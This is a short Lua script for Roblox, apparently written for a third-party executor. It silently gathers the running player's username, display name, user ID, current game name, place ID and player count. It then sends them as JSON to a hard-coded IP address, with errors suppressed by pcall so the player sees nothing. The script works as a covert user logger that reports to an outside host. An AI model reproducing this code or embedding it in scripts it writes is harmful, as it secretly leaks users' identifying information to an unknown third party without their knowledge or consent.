pcall(function()
    local Username = game.Players.LocalPlayer.Name
    local Displayname = game.Players.LocalPlayer.DisplayName
    local UserId = game.Players.LocalPlayer.UserId
    local marketplaceService = game:GetService("MarketplaceService")
    local GameName = "N/A"
    local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, game.PlaceId)
    if isSuccessful then
        GameName = info.Name
    end
    local PlaceId = game.PlaceId
    local PlayerCount = ("%i/%i"):format(game.Players.NumPlayers, game.Players.MaxPlayers)
        
    local Data = {
        Username = Username,
        DisplayName = Displayname,
        UserId = UserId,
        GameName = GameName,
        GamePlaceId = PlaceId,
        PlayerCount = PlayerCount
    }

    local Compiled = game:GetService("HttpService"):JSONEncode(Data)
    
    game:HttpGet(("http://70.105.254.224:218/?json=%s"):format(Compiled))
end)
